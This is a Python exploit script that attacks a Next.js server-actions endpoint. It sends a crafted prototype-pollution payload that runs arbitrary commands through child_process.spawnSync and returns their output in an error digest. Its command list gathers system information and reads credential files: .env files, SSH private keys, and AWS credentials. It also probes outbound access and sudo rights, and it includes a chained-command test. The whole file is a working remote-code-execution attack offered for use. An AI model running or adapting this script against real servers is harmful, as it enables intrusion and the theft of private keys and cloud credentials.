import requests
import sys
import json
import shlex  # Import shlex for robust command splitting

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

# List of commands to test
# These commands are now prepared for direct spawning via spawnSync.
COMMANDS = [
    "id",
    "whoami",
    "uname -a",
    "pwd",
    "ls -la",
    "cat .env",
    "cat .env.local",
    "cat .env.production",
    "cat .env.development",
    "cat ../.env",
    "cat /app/.env",
    "cat ~/.ssh/id_rsa",
    "cat ~/.ssh/id_ed25519",
    "cat ~/.ssh/authorized_keys",
    "cat /root/.ssh/id_rsa",
    "cat /root/.ssh/authorized_keys",
    "cat ~/.aws/credentials",
    "cat ~/.aws/config",
    "cat /root/.aws/credentials",
    "cat /root/.aws/config",
    "curl -fsSL https://www.google.com",
    "wget -qO- https://www.google.com",
    "iptables -L",
    "ufw status",
    "systemctl status ssh",
    "sudo -n true",
    "ping -c 1 8.8.8.8; whoami",
    "node -e \"console.log('hello from Node.js RCE');\"",  # Inline Node.js execution
    "node -e \"require('axios').get('https://www.google.com').then(res => console.log(res.status)).catch(err => console.error(err.message));\"",
    # Axios GET request
]


# Function to execute a single command using spawnSync directly
def execute_spawn_command_direct(full_command_str):
    print(f"\n--- Executing (spawnSync direct): {full_command_str} ---")

    # Split the command string into executable and arguments using shlex for robustness
    parts = shlex.split(full_command_str)
    executable = parts[0]
    args = parts[1:]

    # Construct the JavaScript payload for Node.js spawnSync
    # Note: json.dumps(args) correctly handles empty lists for no arguments
    js_payload_template = """
    var spawnResult = process.mainModule.require('child_process').spawnSync('{executable}', {args_json}); 
    var output = {{
        command: '{executable}',
        args: {args_json}
    }};

    if (spawnResult.error) {{
        if (spawnResult.error.code === 'ENOENT') {{
            output.error = 'Command not found';
            output.message = spawnResult.error.message;
        }} else {{
            output.error = spawnResult.error.message;
        }}
    }}

    output.stdout = spawnResult.stdout?.toString() || '';
    output.stderr = spawnResult.stderr?.toString() || '';
    output.status = spawnResult.status;
    output.signal = spawnResult.signal;

    // Escape backticks in the JSON string to prevent syntax errors in the template literal
    var escapedOutput = JSON.stringify(output).replace(/`/g, '\\`');

    throw Object.assign(new Error('NEXT_REDIRECT'), {{digest: '`' + escapedOutput + '`'}});
    """
    js_payload_content = js_payload_template.format(executable=executable, args_json=json.dumps(args))

    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            "_prefix": js_payload_content,
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }

    files = {
        "0": (None, json.dumps(crafted_chunk)),
        "1": (None, '"$@0"'),
    }

    headers = {"Next-Action": "x"}
    try:
        res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
        print(f"Status Code: {res.status_code}")
        print(f"Response Text: {res.text}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")


# Execute all commands using the direct spawn approach
for cmd in COMMANDS:
    execute_spawn_command_direct(cmd)

print("\n--- All commands executed ---")
